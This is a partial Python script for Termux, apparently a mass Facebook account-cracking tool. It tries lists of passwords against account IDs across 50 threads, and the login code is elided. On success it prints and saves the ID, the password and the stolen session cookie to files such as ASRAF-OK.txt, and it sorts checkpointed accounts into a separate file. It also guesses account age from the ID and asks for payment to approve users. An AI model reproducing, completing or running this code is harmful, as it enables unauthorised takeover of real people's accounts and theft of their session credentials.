...
def main_apv():
    ...
    try:
        ...
        print ("         ༄•───────────────────────────────────────•༄")
        print ("             \033[1;94mGIVE ME 100TK FOR APROVAL ASRAF")     
...
def o():
    ...
    print(" \033[38;5;46m××××××××××××××××××××××××××××××××××××××××××××××××")
    ASRAF = input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;45m Choice Option \033[38;5;196m: ')
    if ASRAF == 'A':
        ASRAF()
    if ASRAF == 'B':
        os.system('xdg-open https://www.facebook.com/fariduzzaman.plabon')
        return None
    if ASRAF == 'C':
        os.system('xdg-open https://facebook.com/groups/1243377296595596/')
        return None
    if ASRAF == 'D':
        os.system('xdg-open https://github.com/Asraf432')
        return None
    if ASRAF == 'E':
        os.system('exit')
        return None
...
logo = ("""
 ...
 \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mCREATED BY\033[38;5;196m   :  \033[38;5;195m ASRAF   \033[38;5;46m|
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mFACEBOK      \033[38;5;196m: \033[38;5;195m RAFI AHMED               \033[38;5;46m|
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mGITHUB       \033[38;5;196m:  \033[38;5;195m ASRAF               \033[38;5;46m|
 ...
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mTEAM         \033[38;5;196m:  \033[38;5;195m COMING SOON 🙂                   \033[38;5;46m|
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mTOOL VIRSION \033[38;5;196m:  \033[38;5;195m 0.2                   \033[38;5;46m|
 \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××
 \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m PLZ SAPPORT ME BRO....
 \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m ASRAF TERMUX zone....
 \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××""")
def linex():
	print(' \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××')
loop = 0
...
def asha(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :ASRAF = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :ASRAF = ' ~> 2009'
        elif uid[:8] in ['10000000']        :ASRAF = ' ~> 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:ASRAF = ' ~> 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:ASRAF = ' 2010'
        elif uid[:6] in ['100001']          :ASRAF = ' ~> 2010/2011'
        elif uid[:6] in ['100002','100003'] :ASRAF = ' ~> 2011/2012'
        elif uid[:6] in ['100004']          :ASRAF = ' - 2012/2013'
        elif uid[:6] in ['100005','100006'] :ASRAF = ' ~> 2013/2014'
        elif uid[:6] in ['100007','100008'] :ASRAF = ' ~> 2014/2015'
        elif uid[:6] in ['100009']          :ASRAF = ' ~> 2015'
        elif uid[:5] in ['10001']           :ASRAF = ' ~> 2015/2016'
        elif uid[:5] in ['10002']           :ASRAF = ' ~> 2016/2017'
        elif uid[:5] in ['10003']           :ASRAF = ' ~> 2018/2019'
        elif uid[:5] in ['10004']           :ASRAF = ' ~> 2019/2020'
        elif uid[:5] in ['10005']           :ASRAF = ' ~> 2020'
        elif uid[:5] in ['10006','10007','']:ASRAF = ' ~> 2021'
        elif uid[:5] in ['10008']           :ASRAF = ' ~>2022'
        elif uid[:5] in ['10009']           :ASRAF = ' ~> 2023'
        else:ASRAF=''
...
def ASRAF():
    ...
    with ThreadPool(max_workers=50) as setu:
        ...
        print(f' \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m TOOL OWNER \033[1;97m: \033[38;5;45mASRAFUL ISLAM ASRAF')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('    \033[38;5;45m[ASRAF-OK💉] '+uid+' | '+ps+'\033[38;5;46m'+asha(uid)+'\n    \033[38;5;196m[Usar Agent🤖]\033[38;5;195m'+pro+' \033[1;91m ')
                print(f'    \033[38;5;46m[COOKIE🍪] \033[38;5;192m'+coki)
                cek_apk(session,coki)
                open('/sdcard/ASRAF-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                #print('\r\r\33[1;31m [ASRAF-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/ASRAF-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r \33[1;93m[%sASRAF\033[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(H,loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
